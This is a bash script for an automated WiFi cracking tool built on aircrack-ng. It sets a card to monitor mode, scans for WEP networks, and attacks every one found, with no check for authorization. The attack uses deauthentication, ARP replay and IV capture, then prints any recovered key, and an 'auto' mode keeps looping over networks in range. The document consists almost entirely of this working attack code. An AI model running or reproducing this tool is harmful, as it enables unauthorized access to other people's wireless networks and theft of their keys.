if [ x"$1" = x"cleanup" -o x"$1" = x"clean" ];then
	cleanup
exit
fi
if [ x"$1" = x"cleanupmon" -o x"$1" = x"cleanmon" ];then
	cleanup
	remonvemon
exit
fi
function startairmonwifidetection {
	airmon-ng > clist01 &
	SCANPID=$!
	PIDOFAIRMON=`pgrep airmon-ng`
	PIDOFAIRMON2=$((PIDOFAIRMON))
	hourglass="|"
	secondcounter=$((0))
	while [ x"$SCANPID" = x"$PIDOFAIRMON" ]; do
		if [ x"$hourglass" = x"|" ]; then 
			hourglass="/"
		else
			if [ x"$hourglass" = x"/" ]; then 
				hourglass="-"
			else
				if [ x"$hourglass" = x"-" ]; then 
					hourglass='\'
				else
					if [ x"$hourglass" = x'\' ]; then 
						hourglass="|"
					fi
				fi
		
			fi
		fi
		echo -ne "Searching for a WiFi card ${hourglass}   \r"
		PIDOFAIRMON2=`pgrep airmon-ng`
		if [ x"$PIDOFAIRMON2" = x"" ]; then
			echo ""
			PIDOFAIRMON="exit"
		fi
		sleep 0.05
		secondcounter=$((secondcounter+5))
		if [ x"$secondcounter" = x"800" ]; then
			echo "It seems that airmon is taking a long time. It may have frozen. Quitting"
			exit
		fi
	done
}
function startairmonwifistarterthingy {
	airmon-ng start $WIFI >tempairmonoutput &
	SCANPID=$!
	PIDOFAIRMON=`pgrep airmon-ng`
	PIDOFAIRMON2=$((PIDOFAIRMON))
	hourglass="|"
	secondcounter=$((0))
	while [ x"$SCANPID" = x"$PIDOFAIRMON" ]; do
		if [ x"$hourglass" = x"|" ]; then 
			hourglass="/"
		else
			if [ x"$hourglass" = x"/" ]; then 
				hourglass="-"
			else
				if [ x"$hourglass" = x"-" ]; then 
					hourglass='\'
				else
					if [ x"$hourglass" = x'\' ]; then 
						hourglass="|"
					fi
				fi
		
			fi
		fi
		echo -ne "Setting $WIFI to monitor mode ${hourglass}   \r"
		PIDOFAIRMON2=`pgrep airmon-ng`
		if [ x"$PIDOFAIRMON2" = x"" ]; then
			echo ""
			PIDOFAIRMON="exit"
		fi
		sleep 0.05
		secondcounter=$((secondcounter+5))
		if [ x"$secondcounter" = x"800" ]; then
			echo "It seems that airmon is taking a long time. It may have frozen. Quitting"
			exit
		fi
	done
}
#Sets first command line Var as 'auto'
if [ x"$1" != x"voice" -a x"$1" != x"passive" ];then
	auto="$1"
fi
if [ x"$2" != x"voice" -a x"$2" != x"passive" ];then
	testcommandvar02="$2"
fi
if [ x"$auto" != x"auto" -a x$auto != x -a x"$auto" != x"voice" ];then
	WIFI=`echo "$auto" | tr -d [:space:]`
	airmoncard=0

	echo $WIFI

else
	if [ x"$auto" = x"auto" -a x"$testcommandvar02" = x"" -o x"$auto" = x"" ];then
		airmontimer01=$((0))
		#Finds the name of your wifi card
		startairmonwifidetection
		percentcounter=$((0))
		count=0
		cat clist01 |while read LINE ; do
			if [ $count -gt 3 -a "$LINE" != "" ];then
				echo "$LINE" | cut -f1 -s >>clist
				count=$((count+1))
			else
				count=$((count+1))
			fi
		done
		rm clist02 2>/dev/null
		for WIFIlist in `cat clist`; do WIFI=`echo $WIFIlist`; done
		testcommandvar03="$WIFI"
		echo "Using WiFi card: " `airmon-ng|grep "$WIFI"`
		if [ x"$voice" = x"yes" ];then
			echo "Using first why-fi card" > voicetempfile.txt
			voiceisago
		fi
		#Check for a wifi card
		if [ x$WIFI = x ]; then
			#Guess no wifi card was detected
			echo "No wifi card detected. Quitting" 
			if [ x"$voice" = x"yes" ];then
				echo "No why-fi cards detected, shutting down auto-crack" > voicetempfile.txt
				voiceisago
			fi
			exit
		fi
		rm clist #Removes this tempfile
		rm clist01 #Removes this tempfile
	else
		if [ x$testcommandvar02 != x ];then
			WIFI=`echo "$testcommandvar02" | tr -d [:space:]`
			echo "Using WiFi card: $WIFI"
		fi
	fi
fi
setclientmac
WIFIforCHANNEL="$WIFI"
#Start the wireless interface in monitor mode
if [ x"$airmoncard" != x"1" ]; then
	if [ x"$voice" = x"yes" ];then
		echo "initializing why-fi card" > voicetempfile.txt
		voiceisago
	fi
	startairmonwifistarterthingy
	#airmon-ng start $WIFI >tempairmonoutput
	airmoncard="1"
fi
#Looks for wifi card thats been set in Monitor mode
if [ x$testcommandvar02 = x ];then
	WIFI=`cat tempairmonoutput|grep "monitor mode enabled on" |cut -b 30-40 | tr -d [:space:] |tr -d ")"`
	if [ x$WIFI = x ];then
		WIFI=`cat tempairmonoutput|grep "monitor mode enabled" |cut -b 1-5 | tr -d [:space:]`
			if [ x"$WIFI" = x"" ]; then
				echo "Moniter mode not detected, Quitting"
				exit
			fi
			
	fi
fi
#sets the CLIENT_MAC var as the mac of this computer
if [ x"$auto" != x"auto" -a x"$auto" != x"" ]; then
	auto=""
fi
if [ x"$1" = x"passive" -o x"$2" = x"passive" -o x"$3" = x"passive" -o x"$4" = x"passive" -o x"$5" = x"passive" ];then
	passivehack="yes"
	echo "Starting passive hack - Will not send packets in any way"
	echo "This works very well on extremely active wifi networks"
else
	passivehack="no"
fi
loopcount=$((0))
while [ x"$auto" = x"auto" -o x"$auto" = x"" ]
do
	
	#checks to see if this is being ran automaticly
	if [ x"$auto" = x"auto" ]; then
		#Guess it is, purging data from last run
		timercounter=0
		reset
	fi
	rm clist 2>/dev/null
	#Starts airodump
	if [ x"$voice" = x"yes" ];then
		echo "Scanning for why-fi networks, please wait" > voicetempfile.txt
		voiceisago
	fi
	airodump-ng -w temp $WIFI > /dev/null 2>/dev/null &
	SCANPID=$!
	# % counter for "wifi scan"
	percentcounter=$((0))
	while [ $((100)) -gt $percentcounter ]; do
		percentcounter=$((percentcounter+1))
		echo -ne "scanning for wifi networks: %""${percentcounter}\r"
		sleep 0.20s #0.20 X 100 loops = 20 seconds
	done
	echo ""
	kill $SCANPID
	sleep 1
	#Opens and cuts airodumps data down to only show the information we need
	cat temp-01.*  | strings | grep -B1000 Station | grep ":" | cut -f 1,4,5,6,8,9,14 -d "," > maclist
	#We are only intrested in WEP networks
	cat maclist |grep "WEP" > 03templist03
	cat 03templist03 | sort -t ',' -k6 -nr > 04templist04
	cat 04templist04 | cut -f 1,2,3,4,5,7 -d "," > 02templist02
	#Compiles list of wifi networks to display for user
	#echo "========== Found the following networks =========="
	#Lists the networks found
	#if [ x"$voice" = x"yes" ];then
	#	echo "Found the following W.E.P. networks" > voicetempfile.txt
	#	voiceisago
	#fi
	wifiAPcount=$((0))
	for EACHMAC in `cat 02templist02 | cut -f 1 -d , `
	do
		wifiAPcount=$((wifiAPcount+1))
		#tempfound=`cat 02templist02 | grep $EACHMAC  | cut -f 6 -d ,| cut -f 2-100 -d " "`
		#echo "Found: $tempfound"
		if [ "$wifiAPcount" -gt $((-1)) ];then
			echo -ne "Found $wifiAPcount Wifi networks\r"
		else
			echo -ne "Found $wifiAPcount Wifi network\r"
		fi
		sleep 0.15s
	done
	echo ""
	#Compiles list of wifi networks for use by this program
	for EACHMAC in `cat 02templist02 | cut -f 1 -d , `
	do
		AIRBSSID=`echo $EACHMAC `
		AIRBSSID2=`echo $EACHMAC | tr -d ":"`
		AIRCHANNEL=`cat 02templist02 | grep $AIRBSSID | cut -f 2 -d , | tr -d [:space:]`
		AIRESSID=`cat 02templist02 | grep $AIRBSSID | cut -f 6 -d ,| cut -f 2-100 -d " "| tr -d "'"`
		#Checks if we already attacked this network
		if [ -e "$AIRESSID"/key_for_"$AIRBSSID2".txt ]; then
			tempkeyfound=`cat "$AIRESSID"/key_for_"$AIRBSSID2".txt | grep "KEY FOUND" ` 2>/dev/null
			if [ x"$tempkeyfound" = x"" ];then
				tempkeyfound=`cat "$AIRESSID"/key_for_"$AIRBSSID2".txt | grep "Attack was unsuccessful" ` 2> /dev/null
			fi
			if [ x"$tempkeyfound" != x"" -o x"$tempkeyfound" = x ]; then
				#Guess we already attacked this network, purging date
				echo "========== Already attacked $AIRESSID =========="
				if [ x"$tempkeyfound" = x"KEY FOUND: The key was not found" -o x"$tempkeyfound" = x"" -o x"$tempkeyfound" = x"Attack was unsuccessful" -o x"$tempkeyfound" = x"KEY FOUND: Attack was unsuccessful" ];then
					echo "But it seems that the key was not found, Launching new attack"
					tempkeyfound=""
					rm tempauth 2>/dev/null
					if [ x"$usestartaircrack" = x"yes" ]; then
						#uses the old startaircrack.sh
						usestartaircrackfunction &
					else
						#Starts the attacking program with the given peramitors
						startthehack &					
					fi
					timecounter=0
					if [ x"$voice" = x"yes" ];then
						echo "Already attacked $AIRESSID, But it seems that the key was not found, launching new attack" > voicetempfile.txt
						voiceisago
					fi 

				else
					if [ x"$voice" = x"yes" ];then
						echo "Already attacked $AIRESSID" > voicetempfile.txt
						voiceisago
					fi 
					timercounter=0
					reset
				fi
			fi
		else
			#Havent attacked this network, starting attack
			tempkeyfound=""
			rm tempauth 2>/dev/null
			echo "========== Now attacking $AIRESSID =========="
			if [ x"$voice" = x"yes" ];then
				echo "Now attacking $AIRESSID" > voicetempfile.txt
				voiceisago
			fi
				if [ x"$usestartaircrack" = x"yes" ]; then
					#uses the old startaircrack.sh
					usestartaircrackfunction &
				else
					#Starts the attacking program with the given peramitors
					startthehack &					
				fi
			timecounter=0 

		fi
		moveon=1
		moveon01=01
		rangefinder=0
		reset
		if [ -e rangefinder ]; then
			rm rangefinder 2>/bin/null
		fi
		deauth="yes"
		voicedeauthcount="0"
		readytostartcracking="yes"
		numberofIVs=0
		authenticatedyet=""
		rwecracking=""
		# Makes a loop that locks this script on to one wifi network
		# Breaks when the key is either found, or not found (because of errors)
		while [ x"$tempkeyfound" = x"" ]; do
			if [ x"$deauth" = x"yes" -a x"$timecounter" = x$((60)) ];then
				if [ x"$passivehack" != x"yes" ]; then
					deauthenticate
				fi
				deauth=no
			fi
			if [ -e temparp ]; then
				if [ x"$arplastline" = x"" ]; then
					numberofARPsent2=`tail -n 1 temparp| cut -f 12 -d ' '`
					numberofARPsent=`echo "|ARP sent:$numberofARPsent2"`
				else
					numberofARPsent2="$arplastline"
					numberofARPsent=`echo "|ARP sent:$numberofARPsent2"`
				fi		
			fi
			if [ -e output*.kismet.csv ]; then
				numberofpacketread=`tail -n 1 output*.kismet.csv| cut -f 12 -d ';'`
				numberofIVs2=`cat output*.kismet.csv | grep "$AIRBSSID" | cut -f 14 -d ";"`
				numberofIVs=$((numberofIVs2))
				if [ $numberofIVs -gt $((1000)) ]; then # Starts aircrack when 1000 IVs are captured.
					if [ x"$readytostartcracking" = x"yes" -a x"$usestartaircrack" != x"yes" ]; then
						startacracking &
						readytostartcracking="no"
						rwecracking="|Cracking IVs"
						echo "There is enough IVs to start aircrack-ng                          "
					fi
				fi
			fi
			# Main output line 
			echo -ne "IVs:${numberofIVs}|Beacons:${numberofpacketread}${numberofARPsent}${authenticatedyet}${rwecracking}\r"
			timecounter=$((timecounter+1))
			#Checks if the AP is still there
			if [ x"$rangefinder" = x$((180)) ]; then 
				echo '#!/bin/bash' > testprogram.sh
				echo 'echo "Please wait..."' >>testprogram.sh
				echo 'testvar001=`cat output-*.kismet.csv | grep "'$AIRBSSID'" | cut -f 12 -d ";" | tr -d [:space:]`' >> testprogram.sh
				echo 'sleep 60s' >> testprogram.sh
				echo 'testvar002=`cat output-*.kismet.csv | grep "'$AIRBSSID'" | cut -f 12 -d ";" | tr -d [:space:]`' >> testprogram.sh
				echo 'if [ x$testvar002 = x$testvar001 ]; then' >> testprogram.sh
				echo '	echo "No such BSSID available" >> rangefinder' >> testprogram.sh
				echo '	exit' >> testprogram.sh
				echo '	else' >> testprogram.sh
				echo '	exit' >> testprogram.sh
				echo 'fi' >> testprogram.sh
				sleep 1s
				chmod 777 testprogram.sh
				./testprogram.sh > /dev/null 2>/dev/null &
				if [ x"$voice" = x"yes" ];then
					echo "Checking range on $AIRESSID" > voicetempfile.txt
					voiceisago
				fi
				rangefinder=0
				
			else
				sleep 1s #This is part of the range finder timer and the master timer
				rangefinder=$((rangefinder+1))			
			fi
			#Waits to continue until the cracking program makes the config files
			if [ -e "$AIRESSID"/key_for_"$AIRBSSID2".txt ]; then
					#Checks for "KEY FOUND" text
					tempkeyfound=`cat "$AIRESSID"/key_for_"$AIRBSSID2".txt | grep "KEY FOUND"` 2> /dev/null
					if [ x"$tempkeyfound" = x"" ];then
					tempkeyfound=`cat "$AIRESSID"/key_for_"$AIRBSSID2".txt | grep "Attack was unsuccessful"` 2> /dev/null
					fi

					#Checks if the 'tempauth' file is there
					if [ -e tempauth ]; then
						authseccessful=`grep "Association successful :-)" tempauth` 2>/dev/null
						if [ x"$authseccessful" != x"" ];then
							authenticatedyet="|Successfully associated"
							if [ x"$voice" = x"yes" -a x"$voicedeauthcount" = x"0" ];then
								echo "Successfully associated with $AIRESSID" > voicetempfile.txt
								voicedeauthcount="1"
								voiceisago
							fi
						fi
						#looks for signs of failure to authenticate
						testvar01=`grep "unsuccessful" tempauth` 2>/dev/null
						testvar02=`grep "No such BSSID available" tempauth` 2>/dev/null
						if [ -e rangefinder ]; then
							testvar03=`grep "No such BSSID available" rangefinder` 2>/dev/null
						fi
						if [ -e temparp ]; then
							testvar04=`grep "No such BSSID available" temparp` 2>/dev/null
						fi					
					fi
					if [ x"$testvar02" != x"" -o x"$testvar03" != x"" ]; then
						#Guess we are out of range
						echo ""
						echo "Out of range, moving on"
						if [ x"$voice" = x"yes" ];then
							echo "We have moved out of range of $AIRESSID, moving on" > voicetempfile.txt
							voiceisago
						fi
						for temppid in `cat tempSCANPID`; do kill $temppid; done 2>/dev/null
						kill $SCANPID01
						timercounter=0
						rm rangefinder 2>/dev/null
						mv *.cap "$AIRESSID" 2>/dev/null
						rm clist 2>/dev/null
						mv output-* "$AIRESSID" 2>/dev/null
						mv temp* "$AIRESSID" 2>/dev/null
						rm "$AIRESSID"/* 2>/dev/null
						rmdir "$AIRESSID" 2>/dev/null
						rangfinder=0
						testvar01=""
						testvar02=""
						testvar03=""
						tempkeyfound="KEY FOUND: Attack was unsuccessful"
					fi
					#Found the word "unsuccessful"
					if [ x"$testvar01" != x"" ]; then
						if [ x$moveon01 != x"0" ]; then
							#Has this error message been said?
							echo "Could not authenticate, checking to see if we are still getting ivs"	
							echo "Please wait"
						if [ x"$voice" = x"yes" ];then
							echo "Could not authenticate, checking to see if we are still getting I.V's, please wait." > voicetempfile.txt
							voiceisago
						fi
						fi
						#Checks for IVs
						testnumber0097=`cat output-01.* | grep $AIRBSSID  | cut -f 11 -d , | tr -d [:space:]`	
						sleep 22
						#Checks for IVs again
						testnumber0098=`cat output-01.* | grep $AIRBSSID  | cut -f 11 -d , | tr -d [:space:]`	
						#Compairs the number of IVs 
						if [ x"$testnumber0098" != x"$testnumber0097" ]; then
							#Are we moving on?
							if [ x$moveon = x"yes" ]; then
								#Guess so, resetting var
								moveon01="0"
							else
								moveon="no"
							fi
						else 
							moveon="yes"
						fi
						#IVs found. not moving on
						if [ x$moveon = x"no" ]; then
							#Has this error message been said?
							if [ x$moveon01 != x"0" ]; then
								echo "Not moving on while still getting ivs"
								moveon01="0"
							fi
						fi
						if [ x$moveon = x"yes" ]; then
							#Guess we are moving on
							echo "Attack was unsuccessful: Out of range"
							if [ x"$voice" = x"yes" ];then
								echo "Attack was unsuccessful: Out of range" > voicetempfile.txt
								voiceisago
							fi
							for temppid in `cat tempSCANPID`; do kill $temppid; done 2> /dev/null
							kill $SCANPID01
							timercounter=0
							moveon=""
							testvar01=""
							testvar02=""
							testvar03=""
							rm tempSCANPID 2>/dev/null
							rm tempauth 2>/dev/null
							mv *.cap "$AIRESSID" 2>/dev/null
							rm clist 2>/dev/null
							mv output-* "$AIRESSID" 2>/dev/null
							mv temp* "$AIRESSID" 2>/dev/null
							rm "$AIRESSID"/* 2>/dev/null
							rmdir "$AIRESSID" 2>/dev/null
							tempkeyfound="KEY FOUND: Attack was unsuccessful"
						fi
				fi
				fi
				if [ x"$timecounter" = x$((3600)) ]; then #Master timer in seconds

					testnumber0097=`cat output-01.*|grep "$AIRBSSID"|grep "WEP"|cut -f 11 -d ","| tr -d [:space:]`
					sleep 22
					testnumber0098=`cat output-01.*|grep "$AIRBSSID"|grep "WEP"|cut -f 11 -d ","| tr -d [:space:]`
					#The time is up, but lets see if we are still gettings IVs
					if [ x"$testnumber0098" != x"$testnumber0097" ]; then
						#Why move on while we are still getting IVs
						echo "Times up, but we are still getting ivs"
						echo "Reseting the timer"
						if [ x"$voice" = x"yes" ];then
							echo "Master timer is up, but we are still getting I.V's, reseting the timer." > voicetempfile.txt
							voiceisago
						fi
						timecounter=0
					else
						#No IVs, lets move on
						echo "Times up, moving on to next AP"
						if [ x"$voice" = x"yes" ];then
							echo "Times up, moving on to next access point" > voicetempfile.txt
							voiceisago
						fi
						#Force kills the open progrms
						for temppid in `cat tempSCANPID`; do kill $temppid > tempkillpid; done 2> /dev/null
						for temppid in `cat SCANPID`; do kill $temppid > tempkillpid; done 2> /dev/null
						kill $SCANPID01
						timercounter=0
						testvar01=""
						testvar02=""
						testvar03=""
						cleanup
						rm "$AIRESSID"/* 2>/dev/null
						rmdir "$AIRESSID" 2>/dev/null
						tempkeyfound="KEY FOUND: Attack was unsuccessful" #Breaks the while loop
					fi
				fi
		done
		if [ -e "$AIRESSID"/key_for_"$AIRBSSID2".txt ]; then
			tempkeyfound=`cat "$AIRESSID"/key_for_"$AIRBSSID2".txt | grep "FOUND"` #Breaks the loop
		fi
		if [ "$tempkeyfound" != "KEY FOUND: Attack was unsuccessful" ]; then
			realkey=`echo $tempkeyfound| tr -d [:space:]| cut -f 4 -d '['| tr -d "]"| tr -d ":"`
			echo "Key - $realkey                            "
			if [ x"$voice" = x"yes" ];then
				echo "A key was found for $AIRESSID" > voicetempfile.txt
				voiceisago
			fi
		else
			echo "Hacking $AIRESSID has failed, a key was not found"
			if [ x"$voice" = x"yes" ];then
				echo "Hacking $AIRESSID has failed,,, a key was not found" > voicetempfile.txt
				voiceisago
			fi		
		fi
	done
	reset
	#If this program is not being asked to run repeatly then it wont repeat
	if [ x"$auto" != x"auto" ]; then
		auto="exit"
		if [ x"$voice" = x"yes" ];then
			echo "Hacking completed, have a nice day!" > voicetempfile.txt
			voiceisago
		fi
	else
		if [ x"$loopcount" = x$((15)) ];then
			echo "This batch file has been running for too long"
			echo "Going to shut down the wifi card and let it rest for about 1 minutes"
			cleanup
			bash $basefilename removemon >/dev/null 2>/dev/null &
			echo "Dont worry, in 1 minutes it will start up again"
			if [ x"$voice" = x"yes" ];then
				echo "This batch file has been running too long and will soon become unstable, Shutting down why-fi card for five minutes. Then will restart the batch file" > voicetempfile.txt
				voiceisago
			fi
			sleep 60s
			bash $basefilename $1 $2 $3 $4 $5 $6 &
			exit;

		else
			loopcount=$((loopcount+1))
		fi
	fi
	cleanup
done
remonvemon
cleanup
exit
